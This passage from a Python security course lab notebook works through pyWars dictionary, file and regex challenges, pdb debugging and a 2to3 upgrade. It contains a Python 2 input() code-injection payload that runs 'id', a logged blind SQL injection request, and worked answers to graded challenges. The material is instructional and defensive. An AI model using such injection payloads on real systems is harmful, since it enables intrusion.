'0.05', 'WinXP': '0.05', 'Linux': '0.15', 'Mac': '0.09', 'Mobile': '0.24'}, '11-2017': {'Win7': '0.45', 'Vista': '0.23', 'NT*': '0.03', 'WinXP': '0.05', 'Linux': '0.15', 'Mac': '0.06', 'Mobile': '0.24'}, '12-2017': {'Win7': '0.42', 'Vista': '0.21', 'NT*': '0.07', 'WinXP': '0.07', 'Linux': '0.14', 'Mac': '0.02', 'Mobile': '0.27'}}

>>> x.get('6-2017')
{'Win7': '0.4', 'Vista': '0.25', 'NT*': '0.05', 'WinXP': '0.09', 'Linux': '0.14', 'Mac': '0.05', 'Mobile': '0.24'}

>>> x.get('6-2017').get('Vista')
'0.25'

>>> d.answer(35, d.data(35).get('6-2017').get('Vista'))
'Correct'
```

**Conclusions:**
In this lab, we covered how to work with dictionaries by doing the following:

- Extracting all the keys and sorting them
- Extracting all the values and sorting them
- Extracting the key value pairs as a list of tuples and sorting them
- Extracting values associated with specific keys

### Exercise 2.3: PDB

- [x] 

**Objectives:**
- Our Rock, Paper, Scissors game is broken. Please fix it!
- Debug the "debugme.py" file in the essential-workshop directory.
- Run debugme.py several times until we find the error
- Debug it! $ python -m pdb debugme.py

		cat debugme.py

```python
# This program has 2 logic errors in it.   Use the pdb program to step through them and find them.
import random
import sys

if sys.version_info.major==2:
    input = raw_input

def askplayer(prompt):
    theirchoice=""
    while theirchoice in ['rock','paper',"scissors"]:
        theirchoice=input(prompt)
    return theirchoice

def mychoice(choices):
    randomnumber=random.randint(1,3)
    try: 
        computerchoice=choices[randomnumber]
    except:
        pass
    return computerchoice
    
def compare(p1,p2):
    if p1==p2:
        return 0
    if p1=='rock' and p2=='paper':
        return 2
    if p1=='rock' and p2=='scissors':
        return 1
    if p1=='paper' and p2=='rock':
        return 1
    if p1=='paper' and p2=='scissors':
        return 2
    if p1=='scissors' and p2=="paper":
         return 1
    if p1=='scissors' and p2=='rock':
        return 2

choices  = ["rock", "paper", "scissors"]

p=askplayer("Enter rock,paper or scissors:")
c=mychoice(choices)
print("I choose "+c)
if compare(p,c)==0:
    print("its a Tie!")
if compare(p,c)==1:
    print("You WIN!!")
if compare(p,c)==2:
    print("You LOSE!!!")
```

	python -m pdb debugme.py

```text
list <enter>	// examine source code
break #			// break on line #
c				// continue
s				// step into
n				// next line
p <expression>	// print
quit()			// quit
```

```python
(Pdb) list
  1  	# This program has 2 logic errors in it.   Use the pdb program to step through them and find them.
  2  ->	import random
  3  	import sys
  4  	
  5  	if sys.version_info.major==2:
  6  	    input = raw_input
  7  	
  8  	def askplayer(prompt):
  9  	    theirchoice=""
 10  	    while theirchoice in ['rock','paper',"scissors"]:
 11  	        theirchoice=input(prompt)

(Pdb) <enter>
 12  	    return theirchoice
 13  	
 14  	def mychoice(choices):
 15  	    randomnumber=random.randint(1,3)
 16  	    try:
 17  	        computerchoice=choices[randomnumber]
 18  	    except:
 19  	        pass
 20  	    return computerchoice
 21  	
 22  	def compare(p1,p2):

(Pdb) <enter>
 23  	    if p1==p2:
 24  	        return 0
 25  	    if p1=='rock' and p2=='paper':
 26  	        return 2
 27  	    if p1=='rock' and p2=='scissors':
 28  	        return 1
 29  	    if p1=='paper' and p2=='rock':
 30  	        return 1
 31  	    if p1=='paper' and p2=='scissors':
 32  	        return 2
 33  	    if p1=='scissors' and p2=="paper":

(Pdb) <enter>
 34  	         return 1
 35  	    if p1=='scissors' and p2=='rock':
 36  	        return 2
 37  	
 38  	choices  = ["rock", "paper", "scissors"]
 39  	
 40  	p=askplayer("Enter rock,paper or scissors:")	// here
 41  	c=mychoice(choices)
 42  	print("I choose "+c)
 43  	if compare(p,c)==0:
 44  	    print("its a Tie!")

(Pdb) b 40
Breakpoint 1 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:40

(Pdb) c
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(40)<module>()
-> p=askplayer("Enter rock,paper or scissors:")

(Pdb) s
--Call--
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(8)askplayer()
-> def askplayer(prompt):

(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(9)askplayer()
-> theirchoice=""

(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(10)askplayer()
-> while theirchoice in ['rock','paper',"scissors"]:

(Pdb) p theirchoice in ['rock', 'paper', 'scissors']
False

(Pdb) quit()
```

Modify while loop to: `while theirchoice not in ['rock','paper',"scissors"]:`

	python debugme.py

```bash
Enter rock,paper or scissors:rock
I choose paper
You LOSE!!!
```

	python debugme.py 
```text
Enter rock,paper or scissors:rock
Traceback (most recent call last):
  File "debugme.py", line 41, in <module>
    c=mychoice(choices)
  File "debugme.py", line 20, in mychoice
    return computerchoice
UnboundLocalError: local variable 'computerchoice' referenced before assignment
```

	python -m pdb debugme.py

```text
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(2)<module>()
-> import random

(Pdb) break mychoice
Breakpoint 1 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:14

(Pdb) c
Enter rock,paper or scissors:rock
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(15)mychoice()
-> randomnumber=random.randint(1,3)

(Pdb) list
 10  	    while theirchoice not in ['rock','paper',"scissors"]:
 11  	        theirchoice=input(prompt)
 12  	    return theirchoice
 13  	
 14 B	def mychoice(choices):
 15  ->	    randomnumber=random.randint(1,3)
 16  	    try:
 17  	        computerchoice=choices[randomnumber]
 18  	    except:
 19  	        pass
 20  	    return computerchoice

(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(16)mychoice()
-> try:

(Pdb) p randomnumber
1

(Pdb) clear 1
Deleted breakpoint 1 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:14

(Pdb) break 16
Breakpoint 2 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:16

(Pdb) condition 2 randomnumber==3
New condition set for breakpoint 2.

(Pdb) c
Enter rock,paper or scissors:rock
I choose scissors
You WIN!!
The program finished and will be restarted
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(2)<module>()
-> import random

(Pdb) c
Enter rock,paper or scissors:rock
I choose paper
You LOSE!!!
The program finished and will be restarted
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(2)<module>()
-> import random

(Pdb) c
Enter rock,paper or scissors:rock
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(16)mychoice()
-> try:

(Pdb) p randomnumber
3
```

randomnumber is set to 3. Considering the following two lines of code, what will happen when we execute the next line that looks up an index of 3 in the 'choices' array?

```text
choices  = ["rock", "paper", "scissors"]
computerchoice=choices[randomnumber]
```

```python
(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(17)mychoice()
-> computerchoice=choices[randomnumber]

(Pdb) n
IndexError: list index out of range
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(17)mychoice()
-> computerchoice=choices[randomnumber]

(Pdb) p len(choices)
3

(Pdb) p choices[1]
'paper'

(Pdb) p choices[2]
'scissors'

(Pdb) p choices[3]
*** IndexError: list index out of range

(Pdb) quit()
```

Correct the code: `randomnumber=random.randint(0,2)`

**Conclusions:**
In this lab, we covered how to work with the Python debugger PDB by doing the following:

- Launching our Python script with the debugger module
- Listing the code about to be executed
- Setting breakpoints
- Stepping through the code
- Printing variables

### Exercise 2.4: Upgrading Using 2to3

- [x] 

**Objectives:**
- Use 2to3 to upgrade a Python2 program to Python3
- Fix any issues that are left behind after using 2to3
- Understand security implications of the continued use of Python2

**No Hints Challenge:**
- Run the bridge_of_death.py program in Python2 to understand the functionality of the program
- Run 2to3 on the program to upgrade it to Python3
- Attempt to rerun the program
- Fix the remaining errors in the program
- Run the upgraded and fixed program in Python2 and examine the security issue that has been created
- Fix the security vulnerability

		cat bridge_of_death.py

```python
#ARTHUR: The Bridge of Death! 
import random
import sys
import codecs
import os

questions = ['What... is your name? ','What... is your favorite color? ','What... is your quest? ','What... is the air-speed velocity of an unladen swallow? ','What... is the capital of Assyria? ']

secret_word1 = "6e6f"
secret_word2 = "6166726963616e206f7220657572"
secret_word3 = "6173737572"
secret_word4 = """x\x9cmOAn\xc20\x10\xbc\xe7\x15\x93S\xc5\xa1\x91\xca\xa1\xd7*mL\x83J\x01\xa1\xb4\x88\xa3!Kb\xc5]Gq\x0c\xe4\xf7\xb5\t=T\xc2kYZ\xef\xcc\xec\xcc\xb6\x96\xfd\x0b0Gi\xf8\xa1G\xc3\xe6\x8c\xde\xff%I\x824\x9c\xe8~\xe5\xb7\x8a\xb6b\xb1@\xb6Z\x8a\x04\xbb\xd5\x17\xf2\xf4[ \x133\x91\x16"C\x91\x0b\xbcn\xe6\xd9\xbb\xf8\x10b-6q\x14\xe5\xd4\x11\x94\x85D>_\x168\x9a\xce\xef#\xbc\x15\xb3$\x8a\x9e&\xd8\x19\x87\xb3\xd2\x1a\x96\x08ti\xb5Q\xbd\xe2\n\x8a[\xd7\xfb\x17\xeb\xa1\xaf\rO!+\xe9;\x7f\xff\xe8\xc0\xa7\xec\x9ak\xdb\xca\x8a\xc2h0\xae\xc3\xde\x98&\x8e\xa6\x13\x14u\xd8\xfd#\x07\xec\t\xc6\xe3:\xd4\x8a{\x0b\xad\x1a\xf2<\xef\xcas\xc6\x01\x1b~l\x87\xad\xec\xfcT\xee\xed?1\x1b#-O\x92\x0fT\xc2Y\xf2\x10g\x9d\xd4z\x80\xaa\xd8tA\x8a,\x8d<\xc9%\xce\xc6\xdb\xa2\xcbA;\xabN\x14`\x8cQ;\xc1Lq\x19\xe2\x05\xd7\xa3\x99[\xa2+\xfb \x19\x9a<gL\xa5\xe5\x10\xb0GE\xba\x84ad>\xcas\xfc\x0bN\xf7\x8f\xc1"""

os.system("clear")
print "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see." 

for qcount in range(3):
    qtxt = random.choice(questions)
    questions.remove(qtxt)
    answer = raw_input(qtxt)
    if secret_word1.decode('hex') in answer.lower() and "color" in qtxt:
        print "You are cast into the Gorge of Eternal Peril"
        sys.exit(1)
    if "swallow" in qtxt:
        if secret_word2.decode('hex') in answer.lower():
            print secret_word4.decode("zip")
        else:
            print "You are cast into the Gorge of Eternal Peril"
        sys.exit(1)
    if secret_word3.decode('hex') <> answer.lower() and "Assyria" in qtxt:
        print "You are cast into the Gorge of Eternal Peril"
        sys.exit(1)

print "Right. Off you go."
```

	python2 bridge_of_death.py

```text
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your favorite color? green
What... is your name? segv
What... is the capital of Assyria? Assur
Right. Off you go.
```

	2to3 -f all -w bridge_of_death.py

```text
-f all	// each fix specifies a transformation; default: all
-w		// write back modified files
```
	
```python
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: Refactored bridge_of_death.py
--- bridge_of_death.py	(original)
+++ bridge_of_death.py	(refactored)
@@ -12,25 +12,25 @@
 secret_word4 = """x\x9cmOAn\xc20\x10\xbc\xe7\x15\x93S\xc5\xa1\x91\xca\xa1\xd7*mL\x83J\x01\xa1\xb4\x88\xa3!Kb\xc5]Gq\x0c\xe4\xf7\xb5\t=T\xc2kYZ\xef\xcc\xec\xcc\xb6\x96\xfd\x0b0Gi\xf8\xa1G\xc3\xe6\x8c\xde\xff%I\x824\x9c\xe8~\xe5\xb7\x8a\xb6b\xb1@\xb6Z\x8a\x04\xbb\xd5\x17\xf2\xf4[ \x133\x91\x16"C\x91\x0b\xbcn\xe6\xd9\xbb\xf8\x10b-6q\x14\xe5\xd4\x11\x94\x85D>_\x168\x9a\xce\xef#\xbc\x15\xb3$\x8a\x9e&\xd8\x19\x87\xb3\xd2\x1a\x96\x08ti\xb5Q\xbd\xe2\n\x8a[\xd7\xfb\x17\xeb\xa1\xaf\rO!+\xe9;\x7f\xff\xe8\xc0\xa7\xec\x9ak\xdb\xca\x8a\xc2h0\xae\xc3\xde\x98&\x8e\xa6\x13\x14u\xd8\xfd#\x07\xec\t\xc6\xe3:\xd4\x8a{\x0b\xad\x1a\xf2<\xef\xcas\xc6\x01\x1b~l\x87\xad\xec\xfcT\xee\xed?1\x1b#-O\x92\x0fT\xc2Y\xf2\x10g\x9d\xd4z\x80\xaa\xd8tA\x8a,\x8d<\xc9%\xce\xc6\xdb\xa2\xcbA;\xabN\x14`\x8cQ;\xc1Lq\x19\xe2\x05\xd7\xa3\x99[\xa2+\xfb \x19\x9a<gL\xa5\xe5\x10\xb0GE\xba\x84ad>\xcas\xfc\x0bN\xf7\x8f\xc1"""
 
 os.system("clear")
-print "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see." 
+print("Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.") 
 
 for qcount in range(3):
     qtxt = random.choice(questions)
     questions.remove(qtxt)
-    answer = raw_input(qtxt)
+    answer = input(qtxt)
     if secret_word1.decode('hex') in answer.lower() and "color" in qtxt:
-        print "You are cast into the Gorge of Eternal Peril"
+        print("You are cast into the Gorge of Eternal Peril")
         sys.exit(1)
     if "swallow" in qtxt:
         if secret_word2.decode('hex') in answer.lower():
-            print secret_word4.decode("zip")
+            print(secret_word4.decode("zip"))
         else:
-            print "You are cast into the Gorge of Eternal Peril"
+            print("You are cast into the Gorge of Eternal Peril")
         sys.exit(1)
-    if secret_word3.decode('hex') <> answer.lower() and "Assyria" in qtxt:
-        print "You are cast into the Gorge of Eternal Peril"
+    if secret_word3.decode('hex') != answer.lower() and "Assyria" in qtxt:
+        print("You are cast into the Gorge of Eternal Peril")
         sys.exit(1)
 
-print "Right. Off you go."
+print("Right. Off you go.")
 
 
RefactoringTool: Files that were modified:
RefactoringTool: bridge_of_death.py
```

	python3 bridge_of_death.py

```python
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is the capital of Assyria? Assur
Traceback (most recent call last):
  File "bridge_of_death.py", line 21, in <module>
    if secret_word1.decode('hex') in answer.lower() and "color" in qtxt:
AttributeError: 'str' object has no attribute 'decode'
```

	vi bridge_of_death.py

```python
secret_word1 = b"6e6f"
secret_word2 = b"6166726963616e206f7220657572"
secret_word3 = b"6173737572"
secret_word4 = b"""x\x9cmOAn\xc20\x10\xbc\xe7\x15\x93S\xc5\xa1\x91
```

	python3 bridge_of_death.py

```python
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your favorite color? green
Traceback (most recent call last):
  File "bridge_of_death.py", line 21, in <module>
    if secret_word1.decode('hex') in answer.lower() and "color" in qtxt:
LookupError: 'hex' is not a text encoding; use codecs.decode() to handle arbitrary codecs
```

LINE # |       REPLACE THIS       |            WITH THIS
-------|--------------------------|----------------------------------
21     |secret_word1.decode('hex')|codecs.decode(secret_word1, 'hex')
25     |secret_word2.decode('hex')|codecs.decode(secret_word2, 'hex')
26     |secret_word4.decode('zip')|codecs.decode(secret_word4, 'zip')
30     |secret_word3.decode('hex')|codecs.decode(secret_word3, 'hex')

	python3 bridge_of_death.py

```python
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is the air-speed velocity of an unladen swallow? 11 mph
Traceback (most recent call last):
  File "bridge_of_death.py", line 21, in <module>
    if codecs.decode(secret_word1, 'hex') in answer.lower() and "color" in qtxt:
TypeError: 'in <string>' requires string as left operand, not bytes
```

LINE # |              FIND THIS           |    ADD .decode() TO THE END LIKE THIS
-------|----------------------------------|-------------------------------------------
21     |codecs.decode(secret_word1, 'hex')|codecs.decode(secret_word1, 'hex').decode()
25     |codecs.decode(secret_word2, 'hex')|codecs.decode(secret_word2, 'hex').decode()
26     |codecs.decode(secret_word4, 'zip')|codecs.decode(secret_word4, 'zip').decode()
30     |codecs.decode(secret_word3, 'hex')|codecs.decode(secret_word3, 'hex').decode()

	python3 bridge_of_death.py

```text
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your favorite color? green
What... is your name? segv
What... is the capital of Assyria? Assur
Right. Off you go.
```

	python2 bridge_of_death.py

```text
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is the capital of Assyria? __import__("os").system("id")
```

Get code execution from Python2 use of insecure input() function:

```text
uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(nopasswdlogin),118(lpadmin),126(sambashare)

Traceback (most recent call last):
  File "bridge_of_death.py", line 21, in <module>
    if codecs.decode(secret_word1, 'hex').decode() in answer.lower() and "color" in qtxt:
AttributeError: 'int' object has no attribute 'lower'
```

Mitigate risk; insert this below the imported modules:

```python
if sys.version_info.major == 2:
	input = raw_input
```

### Exercise 3.1: pyWars File I/O

- [x] 

**Objectives:**
- Perform the file exercises in pyWars
- Will test your ability to:
	- Find files
	- Open text and GZIP files
	- Read text and GZIP files
- Complete as many of the following as you can: 43 through 46

```python
>>> d.question(43)
'Data() contains the absolute path of a filename in your virtual machine.   Determine the length of the file at that path. Open and read the contents of the file. Submit the file size (length of contents) as the answer. '
>>> x = d.data(43)
>>> x
'/home/student/Public/llia_phon-generic.conf'

>>> import pathlib

# METHOD 1--------------------------------------------
>>> file_content = pathlib.Path(x).read_bytes()
>>> len(file_content)
2603

>>> d.answer(43, len(pathlib.Path(d.data(43)).read_bytes()))
'Correct'

# METHOD 2--------------------------------------------
>>> pathlib.Path(x).stat().st_size
2603

>>> d.answer(43, pathlib.Path(d.data(43)).stat().st_size)
'Correct'
```

```python
>>> d.question(44)
'The data() method returns an abosolute path to a directory on your file system.  Submit a sorted list of the filenames in that directory.'
>>> x = d.data(44)
>>> x
'/home/student/Public/log/installer'

import os
>>> import os
>>> sorted(os.listdir(d.data(44)))
['casper.log', 'debug', 'media-info', 'partman', 'syslog', 'version']

>>> d.answer(44, sorted(os.listdir(d.data(44))))
'Correct'
```

```python
>>> d.question(45)
'The data() method will return a tuple.  The first item in the tuple contains the absolute path of a gzip compressed file in your virtual machine.  The second item in the tuple is a line number.  Retrieve that line number from the specified file and submit it as a string.'
>>> x = d.data(45)
>>> x
('/home/student/Public/log/apache2/access.log.2.gz', 66)

>>> import gzip

>>> def doanswer45(tuple_in):
...     file_name, line_num = tuple_in
...     file_list = gzip.open(file_name, "rt").readlines()
...     return file_list[line_num - 1]

>>> doanswer45(x)
'127.0.0.1 - - [12/Jul/2015:15:13:41 -0400] "GET /classlist.php?filter=504%27+and+%28ord%28lower%28mid%28%28users%28%29%29%2C1%2C1%29%29%29=124%29%3B--+%23 HTTP/1.1" 200 949 "-" "Python-urllib/2.7"\n'

>>> d.answer(45, doanswer45(d.data(45)))
'Correct'
```

```python
>>> d.question(46)
'The data() method will return a string. Find all the text files beneath /home/student/Public/log/ that contain that string.  The answer is a sorted list of all of the absolute paths to files that contain the string.  Do not uncompress gzip files.'
>>> x = d.data(46)
>>> x
'fire'

>>> def doanswer46(datasample):
...     answer = []
...     logpath = pathlib.Path.home() / "Public/log"
...     for each_item in logpath.rglob("*"):
...             if not each_item.is_file():
...                     continue
...             file_content = each_item.read_bytes()
...             if datasample.encode() in file_content:
...                     answer.append(str(each_item))
...     return sorted(answer)

>>> doanswer46(x)
['/home/student/Public/log/boot.log', '/home/student/Public/log/dnslogs/10.log', '/home/student/Public/log/dnslogs/11.log', '/home/student/Public/log/dnslogs/12.log', '/home/student/Public/log/dnslogs/13.log', '/home/student/Public/log/dnslogs/14.log', '/home/student/Public/log/dnslogs/15.log', '/home/student/Public/log/dnslogs/17.log', '/home/student/Public/log/installer/syslog', '/home/student/Public/log/upstart/ureadahead.log']

>>> d.answer(46, doanswer46(d.data(46)))
'Correct'
```

**Conclusions:**
- You can now read files and select relevant lines of text from those pages
- The power of programming comes in when you can do analysis and automation with it. For
example, you can calculate statistics and look up other information based on the items you extract
- Now that we know how to open files, we can use regular expressions to pull useful data out of
- them. We will cover that section next

### Exercise 3.2: pyWars Regular Expressions

- [x] 

**Objectives:**
- Use regular expressions to extract IP addresses
- But regular expressions can be used for much more than that
- pyWars challenges 47–52 will build your regular expression ninja skills

```python
>>> d.question(47)
"Read the data element and submit the number of times any instance of the word 'python' (case insensitive) appears in the source. "
>>> x = d.data(47)
>>> x[:200]
'<!doctype html><html lang="en-US"><head><meta http-equiv="content-type" content="text/html; charset=UTF-8"><script>var pL=0, pUrl=\'http://ybinst8.ec.yimg.com/ec/fd/ls/l?IG=4a06ee1546b14fd6844f2e86c37c'

>>> x.lower().count('python')
191

>>> import re
>>> re.findall(r"python", x, re.IGNORECASE)
['python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'Python', 'python', 'python', 'Python', 'Python', 'Python', 'Python', 'Python', 'python', 'Python', 'Python', 'python', 'python', 'python', 'Python', 'python', 'python', 'python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'Python', 'Python', 'python', 'python', 'python', 'Python', 'Python', 'Python', 'Python', 'python', 'python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'Python', 'python', 'python', 'python', 'Python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'Python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'Python', 'python', 'Python', 'python', 'Python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'Python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'python', 'Python', 'Python', 'Python', 'python', 'python', 'Python', 'python', 'Python', 'python', 'Python', 'python', 'Python', 'Python', 'Python', 'Python', 'Python', 'python', 'python', 'Python', 'Python', 'Python', 'Python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python', 'python']

>>> len(re.findall(r"python", x, re.IGNORECASE))
191

>>> d.answer(47, len(re.findall(r"python", d.data(47), re.IGNORECASE)))
'Correct'
```

```python
>>> d.question(48)
'The data element contains a portion of a BIND DNS log file. Use a regular expression to pull all of the Client IP addresses from the entries.   Client IP Addresses are between the word client and before the pound sign.'
>>> d.data (48)
'client 145.65.52.73#21708,client 96.22.134.32#54347,client 176.142.230.134#28965,client 16.163.27.91#32889,client 201.204.7.168#52244,client 32.42.56.208#29889,client 93.248.119.23#41121,client 57.129.87.53#65030,client 234.10.232.127#51930,client 12.168.59.33#35264,client 50.40.3.62#18743,client 99.189.112.26#14359,client 177.228.200.244#49708,client 194.34.106.133#23855'

>>> re.findall(r"client (.*?)#", d.data(48))
['145.65.52.73', '96.22.134.32', '176.142.230.134', '16.163.27.91', '201.204.7.168', '32.42.56.208', '93.248.119.23', '57.129.87.53', '234.10.232.127', '12.168.59.33', '50.40.3.62', '99.189.112.26', '177.228.200.244', '194.34.106.133']

>>> d.answer(48, re.findall(r"client (.*?)#", d.data(48)))
'Correct'
```

```python
>>> d.question(49)
'The data element contains a portion of a BIND DNS log file. Use a regular expression to pull all of the Client IP addresses and the hostname from the entries.   Client IP Addresses are between the word Client and before the pound sign. The hostnames are between the word query: and the word IN. Submit a list of tuples with the IP in the first position and the hostname in the second.'
>>> d.data (49)
'client 60.151.132.109#20304: query: www.host7644173.com IN,client 26.16.23.241#17976: query: www.host443973.com IN,client 200.89.204.91#50981: query: www.host8398179.com IN,client 37.121.164.129#18532: query: www.host6317244.com IN,client 217.76.232.60#13808: query: www.host5420338.com IN,client 5.57.89.242#19033: query: www.host5027976.com IN,client 69.38.148.44#19362: query: www.host3360870.com IN,client 124.89.202.34#41650: query: www.host3497651.com IN'

>>> re.findall(r"client (.*?)#", d.data(49))
['60.151.132.109', '26.16.23.241', '200.89.204.91', '37.121.164.129', '217.76.232.60', '5.57.89.242', '69.38.148.44', '124.89.202.34']

# WORKS ----------------------------------------------

>>> re.findall(r"client (.*?)#.*?query: (.*?) IN", d.data(49))
[('60.151.132.109', 'www.host7644173.com'), ('26.16.23.241', 'www.host443973.com'), ('200.89.204.91', 'www.host8398179.com'), ('37.121.164.129', 'www.host6317244.com'), ('217.76.232.60', 'www.host5420338.com'), ('5.57.89.242', 'www.host5027976.com'), ('69.38.148.44', 'www.host3360870.com'), ('124.89.202.34', 'www.host3497651.com')]

>>> d.answer(49, re.findall(r"client (.*?)#.*?query: (.*?) IN", d.data(49)))
'Correct'

# BETTER ---------------------------------------------

>>> re.findall(r"client ([\d.]+)#\d{1,5}: query: (\S+) IN", d.data(49))
[('60.151.132.109', 'www.host7644173.com'), ('26.16.23.241', 'www.host443973.com'), ('200.89.204.91', 'www.host8398179.com'), ('37.121.164.129', 'www.host6317244.com'), ('217.76.232.60', 'www.host5420338.com'), ('5.57.89.242', 'www.host5027976.com'), ('69.38.148.44', 'www.host3360870.com'), ('124.89.202.34', 'www.host3497651.com')]

>>> d.answer(49, re.findall(r"client ([\d.]+)#\d{1,5}: query: (\S+) IN", d.data(49)))
'Correct'
```

```python
>>> d.question(50)
"The data element is string that contains some numbers surounded by special characters. Use a regular expression to extract only the 3 digit numbers.  If 3 digits are part of a larger number such as a 4 digit number you should not include it in the results. In other words, the three digits must be preceeded by and followed by a non-word character. Example '123 1234'"
>>> x = d.data(50)
>>> x
'886!199!1904 85711113*1017181011767 1572 467!1402 1000*1692!15642137*302187021311 1674!1658!1799*1591#9632779319052135#611#51931345**238'

>>> re.findall(r"\b(\d{3})\b", x)
['886', '199', '467', '611', '238']

>>> d.answer(50, re.findall(r"\b(\d{3})\b", d.data(50)))
'Correct'
```

```python
>>> d.question(51)
'Sentences end in a punctuation (period, question mark or exclamation mark) followed by two spaces.   Data contains a paragraph with multiple sentences.  Use a regular expression to findall() sentences and submit a list of sentences. '
d.data(51)
'Can I be late tomorrow?  I have a Dr. Appt at 8:00 a.m. in the morning.  PI is 3.1415.  '

>>> re.findall(r"[?.!]", d.data(51))
['?', '.', '.', '.', '.', '.', '.']
>>> re.findall(r"[?.!]  ", d.data(51))
['?  ', '.  ', '.  ']
>>> re.findall(r".*?[?.!]  ", d.data(51))
['Can I be late tomorrow?  ', 'I have a Dr. Appt at 8:00 a.m. in the morning.  ', 'PI is 3.1415.  ']

>>> d.answer(51, re.findall(r".*?[?.!]  ", d.data(51)))
'Correct'
```

```python
>>> d.question(52)
'Extract the SSNs from the data.  A SSN is any series of 9 consecutive digits.  Optionally, it may be a series of 3 digits followed by a space or a dash then 2 digits then a space or a dash followed by 4 digits.  Submit a list of SSNs in the order they appear in the data.  All your SSNs should be in the format XXX-XX-XXXX'
>>> x = d.data(52)
>>> x
'hphUDnO-IEB-uMMg087 73 6050ImdTrdxDhBHpMiXurxt356-65-7183fpdarLOVTaYPAOArRIxRxZvxnYv  os811 42 3172IvdZir-WMAQHUhM lEGEpP--I JG806146168eUcZkBAP-Qbd1000 45 5433jlvtTjC M-I-LleT bWK-sliyhcM671046483sR -dfY oxFJiCMF oAkfYqvK 195480832cyj TtaeFdpyBCNPV--pdya503-75-4412PWXwuZs DRBIkV978-58-6621NOJ- yCZX-fWWM-Swj-b339-80-2547 ySCIP QguN jyhE471-09-7192eoz-I--gHgdv'

>>> re.findall(r"\d\d\d[- ]?\d\d[- ]?\d\d\d\d", d.data(52))
['087 73 6050', '356-65-7183', '811 42 3172', '806146168', '000 45 5433', '671046483', '195480832', '503-75-4412', '978-58-6621', '339-80-2547', '471-09-7192']

>>> re.findall(r"(\d{3})[- ]?(\d\d)[- ]?(\d{4})", d.data(52))
[('087', '73', '6050'), ('356', '65', '7183'), ('811', '42', '3172'), ('806', '14', '6168'), ('000', '45', '5433'), ('671', '04', '6483'), ('195', '48', '0832'), ('503', '75', '4412'), ('978', '58', '6621'), ('339', '80', '2547'), ('471', '09', '7192')]

>>> "-".join(('285', '90', '7007'))
'285-90-7007'

>>> map("-".join, re.findall(r"(\d{3})[- ]?(\d\d)[- ]?(\d{4})", d.data(52)))
<map object at 0x7f78756f3a58>

>>> list(map("-".join, re.findall(r"(\d{3})[- ]?(\d\d)[- ]?(\d{4})", d.data(52))))
['087-73-6050', '356-65-7183', '811-42-3172', '806-14-6168', '000-45-5433', '671-04-6483', '195-48-0832', '503-75-4412', '978-58-6621', '339-80-2547', '471-09-7192']

>>> d.answer(52, list(map("-".join, re.findall(r"(\d{3})[- ]?(\d\d)[- ]?(\d{4})", d.data(52)))))
'Correct'
```

**Conclusions:**
You can now use regular expressions to:

- Extract IP addresses
- Count the number of occurrences of a particular word
- Extract sentences
- Extract Social Security numbers
- Extract a specific number of characters

Now we can target useful data in strings with regular expressions for extraction and analysis.

### Exercise 3.3: pyWars Log File Analysis

- [x] 

**Objectives:**
- pyWars challenges 56–60 will help you solidify using regular expressions to parse data
- Completing all of these labs requires approximately 1.5 hours, but 1.5 hours is not provided! You will have to choose one or two
- But you have more challenges you can work on later! All of these are in your local VM copy of the pyWars server
- Brand new to coding? Pick one of the following challenges

```python
>>> import re
>>> d.question(56)
'The data() contains filename of a BIND DNS log and a host name.  Open the file specified from the /home/student/Public/log/dnslogs directory.   The answer is a sorted list of all the client IP addresses in the specified log file that queried that host.'
>>> d.data(56)
('13.log', 'www.sans.org')

>>> logname, hostname = d.data(56)
>>> print(logname, hostname)
13.log www.sans.org

>>> import pathlib
>>> fpath = pathlib.Path("/home/student/Public/log/dnslogs")/logname
>>> logfile = fpath.read_text()
>>> logfile[:120]
